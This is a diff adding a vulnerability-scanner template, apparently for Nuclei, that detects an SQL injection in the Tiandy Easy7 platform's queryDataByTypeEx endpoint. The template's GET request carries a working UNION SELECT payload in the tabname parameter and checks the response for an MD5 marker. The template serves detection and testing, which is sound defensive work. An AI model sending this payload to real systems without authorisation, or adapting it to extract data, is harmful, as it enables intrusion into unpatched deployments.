@@ -1,0 +1,22 @@
+id: tiandiweiye-Easy7-queryDataByTypeEx-sql
+
+info:
+  name: 天地伟业Easy7 queryDataByTypeEx SQL注入漏洞
+  author: tiandiweiye
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /Easy7/rest/workbook/queryDataByTypeEx?tabname=/*!TAB_WORKBOOK_TYPE*/where/**/1=1/**/union/**/select/**/md5(123),1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '202cb962ac59075b964b07152d234b70'
+      - type: status
+        status: 
+          - 200
